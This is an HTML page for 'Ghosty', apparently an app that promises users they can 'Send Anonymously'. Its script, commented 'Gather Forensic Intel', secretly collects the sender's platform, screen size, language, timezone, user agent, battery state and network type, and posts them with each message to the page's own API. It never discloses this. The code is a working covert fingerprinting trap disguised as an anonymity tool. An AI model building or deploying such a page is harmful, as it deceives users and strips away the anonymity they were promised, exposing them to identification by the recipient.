<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ghosty | Send Anonymous Messages</title>
    <link rel="stylesheet" href="style.css">
    <script defer src="/_vercel/insights/script.js"></script>
    <style>
        /* Ghostly Vanish Animation */
        .vanish {
            animation: ghostVanish 0.8s forwards;
            pointer-events: none;
        }

        @keyframes ghostVanish {
            0% {
                transform: scale(1);
                opacity: 1;
                filter: blur(0);
            }

            50% {
                transform: scale(1.05) translateY(-10px);
                opacity: 0.5;
                filter: blur(2px);
            }

            100% {
                transform: scale(0.9) translateY(-20px);
                opacity: 0;
                filter: blur(10px);
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="card">
            <div class="profile-pic">👻</div>
            <h1>Ghosty</h1>
            <p>Send me an anonymous message!</p>

            <textarea id="msgInput" placeholder="Write something secret..." maxlength="500"></textarea>

            <button onclick="sendMsg()" id="sendBtn">Send Anonymously</button>
            <p id="status"></p>
        </div>
    </div>

    <script>
        // 🔊 Preload Success Sound
        const whooshSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2057/2057-preview.mp3');

        async function sendMsg() {
            const btn = document.getElementById('sendBtn');
            const status = document.getElementById('status');
            const msgInput = document.getElementById('msgInput');
            const message = msgInput.value.trim();

            if (!message) return alert("You can't send an empty ghost!");

            btn.disabled = true;
            btn.innerText = "Vanishing...";
            status.innerText = "";

            // 🕵️ Gather Forensic Intel
            let batteryInfo = { level: "N/A", charging: "N/A" };
            try {
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    batteryInfo = {
                        level: Math.round(bat.level * 100) + "%",
                        charging: bat.charging ? "🔌 Charging" : "🔋 Discharging"
                    };
                }
            } catch (e) { }

            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            const deviceInfo = {
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                browser: navigator.userAgent,
                battery: batteryInfo,
                network: conn ? `${conn.effectiveType} (${conn.type || 'data'})` : "Unknown"
            };

            try {
                const res = await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message, deviceInfo })
                });

                const data = await res.json();

                if (res.ok) {
                    // 🔊 sound, 📳 vibration, ✨ animation
                    whooshSound.play();
                    if (navigator.vibrate) navigator.vibrate([50, 100, 50]);
                    msgInput.classList.add('vanish');

                    status.style.color = "#bb86fc";
                    status.innerText = "👻 Your message has haunted their inbox!";

                    setTimeout(() => {
                        msgInput.value = "";
                        msgInput.classList.remove('vanish');
                        startCooldown(30);
                    }, 800);
                } else {
                    status.style.color = "#ff4f4f";
                    status.innerText = `❌ ${data.error || "The ghost got lost."}`;
                    btn.disabled = false;
                    btn.innerText = "Send Anonymously";
                }
            } catch (e) {
                status.style.color = "#ff4f4f";
                status.innerText = "❌ Connection error.";
                btn.disabled = false;
                btn.innerText = "Send Anonymously";
            }
        }

        function startCooldown(seconds) {
            const btn = document.getElementById('sendBtn');
            let timeLeft = seconds;
            const timer = setInterval(() => {
                btn.innerText = `Resting... (${timeLeft}s)`;
                timeLeft--;
                if (timeLeft < 0) {
                    clearInterval(timer);
                    btn.disabled = false;
                    btn.innerText = "Send Anonymously";
                }
            }, 1000);
        }
    </script>
</body>

</html>
